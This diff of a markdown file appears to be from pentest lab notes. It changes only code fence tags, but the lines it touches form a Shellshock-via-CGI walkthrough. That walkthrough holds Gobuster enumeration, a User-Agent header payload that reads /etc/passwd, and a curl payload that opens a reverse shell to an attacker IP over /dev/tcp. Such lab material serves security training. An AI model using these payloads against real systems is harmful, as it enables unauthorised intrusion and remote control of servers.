@@ -6,7 +6,7 @@ A [Common Gateway Interface (CGI)](https://www.w3.org/CGI/) is used to help a we
 ## Shellshock via CGI
 The Shellshock vulnerability allows an attacker to exploit old versions of Bash that save environment variables incorrectly. Typically when saving a function as a variable, the shell function will stop where it is defined to end by the creator. Vulnerable versions of Bash will allow an attacker to execute operating system commands that are included after a function stored inside an environment variable. 
 
-```sh
+```shellsession
 $ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
 ```
 
@@ -14,7 +14,7 @@ $ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
 ### Enumeration - Gobuster
 We can hunt for CGI scripts using a tool such as `Gobuster`. Here we find one, `access.cgi`.
 
-```sh
+```shellsession
 $ gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
 
 ===============================================================
@@ -40,7 +40,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 ### Confirming the vulnerability
 
-```sh
+```shellsession
 $ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
 
 root:x:0:0:root:/root:/bin/bash
@@ -56,7 +56,7 @@ mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
 
 ### Exploitation to Reverse Shell Access
 
-```sh
+```shellsession
 $ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
 
 ```
